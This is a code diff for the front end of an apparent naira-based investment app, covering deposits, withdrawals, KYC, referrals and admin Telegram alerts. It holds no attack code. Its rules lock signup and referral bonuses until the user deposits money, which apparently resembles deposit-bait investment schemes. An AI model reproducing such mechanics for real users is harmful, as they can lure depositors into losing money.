-    const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/upload`, { method: "POST", body: fd });
+    const res  = await fetch(`https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/upload`, { method: "POST", body: fd });
     const data = await res.json();
     return data.secure_url;
   } catch {
@@ -859,24 +1001,30 @@ async function uploadToCloudinary(file) {
 document.getElementById("btn-submit-deposit")?.addEventListener("click", async () => {
   const amount = parseFloat(document.getElementById("deposit-amount-input").value);
   if (!amount || amount < 1000) return showToast("Minimum deposit is ₦1,000", "error");
-  if (!depositFileUrl) return showToast("Please upload your payment receipt", "error");
+  if (!depositFileUrl)          return showToast("Please upload your payment receipt", "error");
 
   setLoading("btn-submit-deposit", true, "Submit Deposit");
   try {
-    await addDoc(collection(db, "deposits"), {
-      uid: currentUser.uid,
-      userName: userData.fullName,
-      userEmail: userData.email,
-      phone: userData.phone || "",
+    await withRetry(() => addDoc(collection(db, "deposits"), {
+      uid:         currentUser.uid,
+      userName:    userData.fullName,
+      userEmail:   userData.email,
+      phone:       userData.phone || "",
       amount,
-      receiptUrl: depositFileUrl,
-      status: "pending",
-      createdAt: serverTimestamp()
-    });
+      receiptUrl:  depositFileUrl,
+      status:      "pending",
+      createdAt:   serverTimestamp()
+    }));
 
-    // Notify admin on Telegram
     await sendTelegramAlert(
       `💰 <b>New Deposit Request</b>\n👤 ${userData.fullName}\n📱 ${userData.phone || "N/A"}\n📧 ${userData.email}\n💵 ₦${amount.toLocaleString()}\n🧾 Receipt submitted`
+    );
+
+    await addNotification(
+      currentUser.uid,
+      "deposit",
+      "💳 Deposit Submitted",
+      `₦${amount.toLocaleString()} deposit request received. Awaiting admin approval.`
     );
 
     closeModal("modal-deposit");
@@ -891,8 +1039,8 @@ document.getElementById("btn-submit-deposit")?.addEventListener("click", async (
 //  PAYMENT PAGE (with timer)
 // ============================================================
 window.showPaymentPage = function() {
-  document.getElementById("pay-bank").textContent = PAYMENT_DETAILS.bank;
-  document.getElementById("pay-name").textContent = PAYMENT_DETAILS.accountName;
+  document.getElementById("pay-bank").textContent   = PAYMENT_DETAILS.bank;
+  document.getElementById("pay-name").textContent   = PAYMENT_DETAILS.accountName;
   document.getElementById("pay-number").textContent = PAYMENT_DETAILS.accountNumber;
   closeModal("modal-deposit");
   openModal("modal-payment");
@@ -937,19 +1085,13 @@ window.donePayment = function() {
 window.openWithdrawModal = function() {
   if (!userData) return;
 
-  const minPlan = PLANS[0]; // Starter plan — minimum deposit required
-
+  const minPlan     = PLANS[0];
   const bonusBal    = userData.bonusBalance    || 0;
   const referralBal = userData.referralBalance || 0;
   const earnsBal    = userData.earningsBalance  || 0;
   const elapsed     = userData.planDaysElapsed  || 0;
   const canWithdrawEarnings = elapsed >= WITHDRAW_DELAY_DAYS;
 
-  // ── RULE: no withdrawals of ANY kind until the user has made their first deposit.
-  // Once depositMade = true, ALL balances unlock:
-  //   • signup bonus    → immediately
-  //   • referral bonus  → immediately (referrer already deposited before their referee joined)
-  //   • earnings        → after Day 2 of active plan
   if (!userData.depositMade) {
     document.getElementById("withdraw-bonus-row").style.display = "none";
     const refRow = document.getElementById("withdraw-referral-row");
@@ -964,21 +1106,19 @@ window.openWithdrawModal = function() {
     return;
   }
 
-  // User has deposited — calculate what's available
   const available = bonusBal + referralBal + (canWithdrawEarnings ? earnsBal : 0);
 
-  // Show breakdown
-  document.getElementById("withdraw-bonus-row").style.display = bonusBal > 0 ? "flex" : "none";
-  document.getElementById("withdraw-bonus-val").textContent   = fmt(bonusBal);
+  const combinedBonusLabel = referralBal > 0
+    ? `${fmt(bonusBal)} bonus + ${fmt(referralBal)} referral`
+    : fmt(bonusBal);
+  document.getElementById("withdraw-bonus-row").style.display    = (bonusBal + referralBal) > 0 ? "flex" : "none";
+  document.getElementById("withdraw-bonus-val").textContent       = combinedBonusLabel;
 
   const refRow = document.getElementById("withdraw-referral-row");
-  if (refRow) {
-    refRow.style.display = referralBal > 0 ? "flex" : "none";
-    document.getElementById("withdraw-referral-val").textContent = fmt(referralBal);
-  }
+  if (refRow) refRow.style.display = "none";
 
   document.getElementById("withdraw-earnings-row").style.display = "flex";
-  document.getElementById("withdraw-earnings-val").textContent = canWithdrawEarnings
+  document.getElementById("withdraw-earnings-val").textContent   = canWithdrawEarnings
     ? fmt(earnsBal)
     : `${fmt(earnsBal)} (unlocks Day 2)`;
   document.getElementById("withdraw-balance-val").textContent = fmt(available);
@@ -1007,7 +1147,6 @@ document.getElementById("btn-submit-withdraw")?.addEventListener("click", async 
   const bank    = document.getElementById("wd-bank-name").value.trim();
   const accName = document.getElementById("wd-account-name").value.trim();
 
-  // Hard guard — no withdrawals before first deposit
   if (!userData?.depositMade) {
     return showToast("Make your first deposit (min. ₦4,000 Starter Plan) to unlock withdrawals", "error");
   }
@@ -1018,43 +1157,48 @@ document.getElementById("btn-submit-withdraw")?.addEventListener("click", async 
   const elapsed     = userData?.planDaysElapsed  || 0;
   const canWithdrawEarnings = elapsed >= WITHDRAW_DELAY_DAYS;
 
-  // After first deposit: bonus + referral immediately available; earnings after Day 2
   const available = bonusBal + referralBal + (canWithdrawEarnings ? earnsBal : 0);
 
-  if (!amount || amount < 500)      return showToast("Minimum withdrawal is ₦500", "error");
-  if (amount > available)            return showToast("Insufficient available balance", "error");
-  if (!accNum || !bank || !accName)  return showToast("Fill all bank details", "error");
+  if (!amount || amount < 500)     return showToast("Minimum withdrawal is ₦500", "error");
+  if (amount > available)          return showToast("Insufficient available balance", "error");
+  if (!accNum || !bank || !accName) return showToast("Fill all bank details", "error");
 
   // Deduct: referral first → bonus → earnings
-  let remaining = amount;
-  const deductReferral = Math.min(remaining, referralBal);                        remaining -= deductReferral;
-  const deductBonus    = Math.min(remaining, bonusBal);                           remaining -= deductBonus;
+  let remaining       = amount;
+  const deductReferral = Math.min(remaining, referralBal); remaining -= deductReferral;
+  const deductBonus    = Math.min(remaining, bonusBal);    remaining -= deductBonus;
   const deductEarnings = Math.min(remaining, canWithdrawEarnings ? earnsBal : 0);
 
   setLoading("btn-submit-withdraw", true, "Request Withdrawal");
   try {
     const uid = currentUser.uid;
-    await updateDoc(doc(db, "users", uid), {
+    await withRetry(() => updateDoc(doc(db, "users", uid), {
       bankAccount: accNum, bankName: bank, accountName: accName,
       ...(deductReferral > 0 ? { referralBalance: increment(-deductReferral) } : {}),
       ...(deductBonus    > 0 ? { bonusBalance:    increment(-deductBonus)    } : {}),
       ...(deductEarnings > 0 ? { earningsBalance: increment(-deductEarnings) } : {})
-    });
+    }));
 
-    await addDoc(collection(db, "withdrawals"), {
+    await withRetry(() => addDoc(collection(db, "withdrawals"), {
       uid, userName: userData.fullName, userEmail: userData.email,
       phone: userData.phone || "",
       amount, accNum, bank, accName,
       status: "pending", createdAt: serverTimestamp()
-    });
+    }));
 
-    await addDoc(collection(db, "transactions"), {
+    await withRetry(() => addDoc(collection(db, "transactions"), {
       uid, type: "withdraw", amount,
       description: `Withdrawal to ${bank} (${accNum})`,
       status: "pending", createdAt: serverTimestamp()
-    });
+    }));
 
-    // Notify admin on Telegram
+    await addNotification(
+      uid,
+      "withdrawal",
+      "📤 Withdrawal Requested",
+      `₦${amount.toLocaleString()} withdrawal to ${bank} (${accNum}) submitted. Processing within 24 hrs.`
+    );
+
     await sendTelegramAlert(
       `💸 <b>Withdrawal Request</b>\n👤 ${userData.fullName}\n📱 ${userData.phone || "N/A"}\n💰 ₦${amount.toLocaleString()}\n🏦 ${bank}\n🔢 ${accNum}\n📋 ${accName}`
     );
@@ -1073,9 +1217,9 @@ document.getElementById("btn-submit-withdraw")?.addEventListener("click", async 
 function renderProfile() {
   if (!userData) return;
   const name = userData.fullName || "Investor";
-  document.getElementById("profile-name").textContent = name;
+  document.getElementById("profile-name").textContent       = name;
   document.getElementById("profile-email-text").textContent = userData.email || "";
-  document.getElementById("profile-ref-code").textContent = userData.referralCode || "";
+  document.getElementById("profile-ref-code").textContent   = userData.referralCode || "";
   document.getElementById("profile-avatar-big").textContent = name[0].toUpperCase();
   document.getElementById("profile-phone-text").textContent = userData.phone || "Not set";
   document.getElementById("profile-kyc-status").textContent = userData.kycStatus === "verified" ? "✓ Verified" : "Pending";
@@ -1085,18 +1229,18 @@ function renderProfile() {
 //  ACCOUNT UPDATE MODAL
 // ============================================================
 window.openAccountModal = function() {
-  document.getElementById("acc-fullname").value = userData?.fullName || "";
-  document.getElementById("acc-phone").value = userData?.phone || "";
-  document.getElementById("acc-bank").value = userData?.bankName || "";
+  document.getElementById("acc-fullname").value       = userData?.fullName || "";
+  document.getElementById("acc-phone").value          = userData?.phone || "";
+  document.getElementById("acc-bank").value           = userData?.bankName || "";
   document.getElementById("acc-account-number").value = userData?.bankAccount || "";
-  document.getElementById("acc-account-name").value = userData?.accountName || "";
+  document.getElementById("acc-account-name").value   = userData?.accountName || "";
   openModal("modal-account");
 };
 
 document.getElementById("btn-save-account")?.addEventListener("click", async () => {
-  const fullName = document.getElementById("acc-fullname").value.trim();
-  const phone    = document.getElementById("acc-phone").value.trim();
-  const bankName = document.getElementById("acc-bank").value.trim();
+  const fullName    = document.getElementById("acc-fullname").value.trim();
+  const phone       = document.getElementById("acc-phone").value.trim();
+  const bankName    = document.getElementById("acc-bank").value.trim();
   const bankAccount = document.getElementById("acc-account-number").value.trim();
   const accountName = document.getElementById("acc-account-name").value.trim();
 
@@ -1104,9 +1248,9 @@ document.getElementById("btn-save-account")?.addEventListener("click", async () 
 
   setLoading("btn-save-account", true, "Save Changes");
   try {
-    await updateDoc(doc(db, "users", currentUser.uid), {
+    await withRetry(() => updateDoc(doc(db, "users", currentUser.uid), {
       fullName, phone, bankName, bankAccount, accountName
-    });
+    }));
     await updateProfile(currentUser, { displayName: fullName });
     closeModal("modal-account");
     showToast("Profile updated successfully", "success");
@@ -1123,13 +1267,13 @@ window.renderReferralTab = async function() {
   if (!userData || !currentUser) return;
   const ref  = userData.referralCode || "";
   const link = `${window.location.origin}${window.location.pathname}?ref=${ref}`;
-  document.getElementById("ref-tab-link").textContent       = link;
-  document.getElementById("ref-tab-bonus-bal").textContent  = fmt(userData.referralBalance || 0);
+  document.getElementById("ref-tab-link").textContent      = link;
+  document.getElementById("ref-tab-bonus-bal").textContent = fmt(userData.referralBalance || 0);
 
   try {
     const snap = await getDocs(query(collection(db, "users"), where("referredBy", "==", currentUser.uid)));
     document.getElementById("ref-tab-count").textContent    = snap.size;
-    document.getElementById("ref-tab-earnings").textContent = fmt(snap.size * 2000);
+    document.getElementById("ref-tab-earnings").textContent = fmt(snap.size * REFERRAL_BONUS);
   } catch (_) {}
 };
 
@@ -1153,7 +1297,7 @@ window.joinTelegram = function() {
   closeModal("modal-telegram-prompt");
 };
 
-// Legacy aliases (used in old modal-referral HTML)
+// Legacy aliases
 window.copyRefLink  = window.copyRefLinkTab;
 window.shareRefLink = window.shareRefLinkTab;
 
@@ -1182,11 +1326,11 @@ document.getElementById("btn-submit-kyc")?.addEventListener("click", async () =>
   if (!kycFileUrl) return showToast("Please upload your ID document", "error");
   setLoading("btn-submit-kyc", true, "Submit KYC");
   try {
-    await updateDoc(doc(db, "users", currentUser.uid), { kycStatus: "pending", kycDoc: kycFileUrl });
-    await addDoc(collection(db, "kyc"), {
+    await withRetry(() => updateDoc(doc(db, "users", currentUser.uid), { kycStatus: "pending", kycDoc: kycFileUrl }));
+    await withRetry(() => addDoc(collection(db, "kyc"), {
       uid: currentUser.uid, userName: userData.fullName,
       docUrl: kycFileUrl, status: "pending", createdAt: serverTimestamp()
-    });
+    }));
     closeModal("modal-kyc");
     showToast("KYC submitted! Under review.", "success");
   } catch (err) {
@@ -1199,7 +1343,6 @@ document.getElementById("btn-submit-kyc")?.addEventListener("click", async () =>
 //  ANNOUNCEMENTS
 // ============================================================
 async function loadAnnouncements() {
-  // Client-side sort — avoids Firestore composite index requirement
   const snap = await getDocs(collection(db, "announcements"));
   const list = snap.docs.map(d => d.data())
     .sort((a, b) => (b.createdAt?.seconds || 0) - (a.createdAt?.seconds || 0))
@@ -1227,7 +1370,8 @@ async function loadAnnouncements() {
 // ============================================================
 window.logout = async function() {
   if (!confirm("Sign out of your account?")) return;
-  if (unsubscribeSnapshot) unsubscribeSnapshot();
+  if (unsubscribeSnapshot)      { unsubscribeSnapshot();      unsubscribeSnapshot = null; }
+  if (unsubscribeNotifications) { unsubscribeNotifications(); unsubscribeNotifications = null; }
   await signOut(auth);
   showScreen("screen-login");
 };
@@ -1285,7 +1429,7 @@ document.querySelectorAll(".modal-overlay").forEach(overlay => {
 // ============================================================
 (function checkRefUrl() {
   const params = new URLSearchParams(window.location.search);
-  const ref = params.get("ref");
+  const ref    = params.get("ref");
   if (ref) {
     const refInput = document.getElementById("reg-ref");
     if (refInput) refInput.value = ref;
